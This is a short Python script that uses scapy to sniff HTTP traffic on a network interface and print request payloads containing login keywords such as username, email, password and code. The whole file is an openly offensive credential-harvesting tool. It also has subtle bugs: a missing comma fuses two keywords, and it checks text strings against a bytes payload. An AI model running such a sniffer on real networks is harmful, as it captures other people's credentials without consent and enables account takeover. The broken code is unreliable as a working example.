#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import optparse

parser = optparse.OptionParser()

parser.add_option("-i", "--interface", dest="interface", help="Enter interface to be sniffed")
(options, args) = parser.parse_args()


def process_sniffed_packet(packet: scapy.Packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            login_keywords = ['user', 'username', 'uname', 'phone', 'mobile', 'email', 'mail'
                                                                                       'pass', 'password', 'code',
                              'remember']

            for word in login_keywords:
                if word in load:
                    print("[+] suspected auth credits: " + str(load))


def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_sniffed_packet)


if not options.interface:
    print("[-] please enter interface -i or --interface")
    exit(0)

else:
    interface = options.interface
    sniff(interface)
